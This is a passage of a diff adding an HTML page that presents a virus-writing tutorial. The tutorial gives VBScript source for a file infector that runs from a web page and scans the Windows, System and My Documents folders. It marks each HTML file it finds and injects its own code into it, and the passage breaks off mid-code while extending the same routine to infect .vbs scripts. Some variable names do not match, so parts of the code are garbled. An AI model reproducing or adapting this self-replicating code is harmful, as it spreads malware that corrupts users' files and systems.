+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>e=&quot;0&quot;&amp;e</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>f=f+e</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>f=f+&quot;&quot;&quot;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>htmf.WriteLine f</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>htmf.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>#####################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B># III: HTML -&gt; HTML #</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>#####################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>It's a simple routine. Like in VBS (and it's in VBS).</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>This a part of source :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&lt;mark&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' the mark</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&lt;html&gt;&lt;head&gt;&lt;title&gt;You're title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&lt;script language=VBScript&gt;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>On Error Resume Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set ws=CreateObject(&quot;WScript.Shell&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If err.number=429 Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' err number if user click NO</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>ws.Run javascript:location.reload()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Else</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>infhtm(uplobu.GetSpecialFolder(0))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' call the infhtm function</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>infhtm(uplobu.GetSpecialFolder(1))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' in specific folder (better)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>infhtm(unlgeu.SpecialFolders(&quot;MyDocuments&quot;))</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Function infhtm(dir)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If fso.FolderExists(dir) Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set ibamih=fso.GetFolder(dir)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set vtob=ibamih.Files</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>For each f1 in vtob</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>ext=lcase(uplobu.GetExtensionName(f1.Name))</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If ext=&quot;htm&quot; or ext=&quot;html&quot; Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' check extension</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set eqybwx=fso.OpenTextFile(djra.path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If eqybwx.ReadLine &lt;&gt; &quot;&lt;mark&gt;&quot; Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' already infected ??</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.Close()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;Set eqybwx=fso.OpenTextFile(djra.path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;htmorg=eqybwx.ReadAll()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.Close()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;Set virushtm=document.body.CreateTextRange</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;Set eqybwx=fso.CreateTextFile(djra.path, True, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.WriteLine &quot;&lt;mark&gt;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' put the mark</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.Write(htmorg)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' put the real code</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.WriteLine virushtm.htmltext&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' put te htm virus</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.Close()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Else</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;eqybwx.Close()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Function</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>really simple no ??</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>###################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B># IV: VBS -&gt; HTML #</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>###################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>So this is the the last part.</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Look at the second part, I write</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;......&nbsp;&nbsp;&nbsp;&nbsp;NO FINISH, SEE THE fourth chapter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' Here the infection HTML -&gt; VBS</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>We must search here the VBS file. The same way that we infect HTM/HTML file.</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>In the HTML virus we have :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If ext=&quot;htm&quot; or ext=&quot;html&quot; Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>So we add</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>ElseIf ext=&quot;vbs&quot; Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set cot = fso.OpenTextFile(f1.Path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;If cot.ReadLine &lt;&gt; &quot;'mark&quot; Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' check is already infected</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;cot.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set cot = fso.OpenTextFile(f1.Path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
